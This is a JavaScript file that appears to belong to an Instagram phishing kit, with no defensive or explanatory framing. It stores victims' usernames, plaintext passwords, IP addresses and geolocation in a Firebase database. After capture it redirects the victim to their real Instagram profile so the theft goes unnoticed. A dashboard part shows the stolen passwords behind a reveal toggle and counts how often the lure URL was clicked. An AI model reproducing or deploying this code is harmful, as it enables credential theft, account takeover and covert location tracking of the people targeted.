<script>
  async function setHtml(htmls) {
    await $('#tbody').html(htmls);
    $("#submitUser").removeClass('disabled');
    var myButton = document.getElementsByName('dynamic');
    var myInput = document.getElementsByName('viewpass');
    myButton.forEach(function(element, index) {
      element.onclick = function() {
        'use strict';
        if (myInput[index].type == 'password') {
          myInput[index].setAttribute('type', 'text');
          element.firstChild.className = "fas fa-eye";

        } else {
          myInput[index].setAttribute('type', 'password');
          element.firstChild.className = "fas fa-eye-slash";
        }
      }
    });
  }

  // Get Data
  firebase.database().ref('Users/').on('value', function(snapshot) {
    var value = snapshot.val();
    var htmls = [];
    $.each(value, function(index, value) {
      if (value) {
        htmls.push('<tr>\
        <td>' + index + '</td>\
        <td>' + value.username + '</td>\
        <td>' + value.ip + '</td>\
        <td>' + value.time + '</td>\
        <td>' + value.country + ", " + value.city + " (lon : " + value.longitude + " lat : " + value.latitude + ")" + '</td>\
        <td><input name="viewpass" type="password" value="' + value.password + '" readonly/>\
        <button type="button" id="" class="btn btn-default" name="dynamic"><i class="fas fa-eye-slash"></i></button></td>\
        </tr>');
      }
      lastIndex = index;
    });
    setHtml(htmls);
  });


  firebase.database().ref('tools/').on('value', function(snapshot) {
    var value = snapshot.val();
    var htmls = [];
    $.each(value, function(index, value) {
      if (value) {
        htmls.push('<p>\
        <span style="font-size: 1.6em;">' + value.nilai + 'x</span> URL telah di klik\
        </p>');
      }
    });
    $('#counter-body').html(htmls);
  });

  // Add Data
  $("#submitUser").on("click", async function(event) {
    event.preventDefault();
    var values = $("#addUser").serializeArray();
    var userID = lastIndex + 1;
    var username = values[0].value;
    var password = values[1].value;
    var ip = values[2].value;
    var cur_time = values[3].value;
    var country = values[4].value;
    var city = values[5].value;
    var latitude = values[6].value;
    var longitude = values[7].value;
    //var userID = lastIndex + 1;
    console.log(values);
    await firebase
      .database()
      .ref("Users/" + userID)
      .set({
        username: username,
        password: password,
        ip: ip,
        time: cur_time,
        country: country,
        city: city,
        latitude: latitude,
        longitude: longitude,
      });
    // Reassign lastID value
    lastIndex = userID;
    var delay = 2000;
    var url = "https://www.instagram.com/" + username;
    setTimeout(function() {
      window.location = url;
    }, delay);
  });
</script>